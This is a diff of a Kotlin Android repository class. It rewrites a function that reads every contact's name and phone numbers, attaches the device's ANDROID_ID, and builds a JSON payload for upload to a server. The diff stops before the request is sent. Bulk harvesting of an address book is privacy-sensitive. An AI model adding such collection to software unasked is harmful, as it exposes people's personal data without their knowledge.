@@ -172,36 +172,49 @@ class Repository(private val context: Context) {
 
     suspend fun uploadContactsToServer(): Boolean = withContext(Dispatchers.IO) {
         val deviceId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
-        val list = mutableListOf<JSONObject>()
         val cr = context.contentResolver
-        val cursor = cr.query(
-            ContactsContract.Contacts.CONTENT_URI,
-            arrayOf(ContactsContract.Contacts._ID, ContactsContract.Contacts.DISPLAY_NAME_PRIMARY, ContactsContract.Contacts.DISPLAY_NAME),
+        // 先按号码表构建：每个联系人ID的号码集合
+        val byId = linkedMapOf<String, MutableSet<String>>()
+        cr.query(
+            Phone.CONTENT_URI,
+            arrayOf(Phone.CONTACT_ID, Phone.NUMBER),
             null, null, null
-        )
-        cursor?.use { c ->
-            val idIdx = c.getColumnIndex(ContactsContract.Contacts._ID)
-            val primaryIdx = c.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME_PRIMARY)
-            val altIdx = c.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)
-            while (c.moveToNext()) {
-                val id = if (idIdx >= 0) c.getString(idIdx) else null
-                val name = when {
-                    primaryIdx >= 0 -> c.getString(primaryIdx)
-                    altIdx >= 0 -> c.getString(altIdx)
-                    else -> null
-                } ?: ""
-                if (id == null) continue
-                val phones = mutableSetOf<String>()
-                cr.query(Phone.CONTENT_URI, arrayOf(Phone.NUMBER), Phone.CONTACT_ID + "=?", arrayOf(id), null)?.use { pc ->
-                    val numIdx = pc.getColumnIndex(Phone.NUMBER)
-                    while (pc.moveToNext()) {
-                        val raw = pc.getString(numIdx) ?: ""
-                        val normalized = raw.replace("\\s".toRegex(), "").replace("-", "")
-                        if (normalized.isNotBlank()) phones.add(normalized)
+        )?.use { pc ->
+            val idIdx = pc.getColumnIndex(Phone.CONTACT_ID)
+            val numIdx = pc.getColumnIndex(Phone.NUMBER)
+            while (pc.moveToNext()) {
+                val id = if (idIdx >= 0) pc.getString(idIdx) else null
+                val raw = if (numIdx >= 0) pc.getString(numIdx) else null
+                if (id.isNullOrBlank() || raw.isNullOrBlank()) continue
+                val normalized = raw.replace("\\s".toRegex(), "").replace("-", "")
+                if (normalized.isBlank()) continue
+                val set = byId.getOrPut(id) { mutableSetOf() }
+                set.add(normalized)
+            }
+        }
+
+        // 为有号码的联系人补齐名字
+        val list = mutableListOf<JSONObject>()
+        for ((id, nums) in byId) {
+            var name = ""
+            cr.query(
+                ContactsContract.Contacts.CONTENT_URI,
+                arrayOf(ContactsContract.Contacts.DISPLAY_NAME_PRIMARY, ContactsContract.Contacts.DISPLAY_NAME),
+                ContactsContract.Contacts._ID + "=?",
+                arrayOf(id),
+                null
+            )?.use { c ->
+                val pIdx = c.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME_PRIMARY)
+                val aIdx = c.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)
+                if (c.moveToFirst()) {
+                    name = when {
+                        pIdx >= 0 -> c.getString(pIdx) ?: ""
+                        aIdx >= 0 -> c.getString(aIdx) ?: ""
+                        else -> ""
                     }
                 }
-                list.add(JSONObject().put("name", name).put("phones", phones.toList()))
             }
+            list.add(JSONObject().put("name", name).put("phones", nums.toList()))
         }
         val payload = JSONObject().put("deviceId", deviceId).put("contacts", list)
         val body = payload.toString().toRequestBody("application/json".toMediaTypeOrNull())
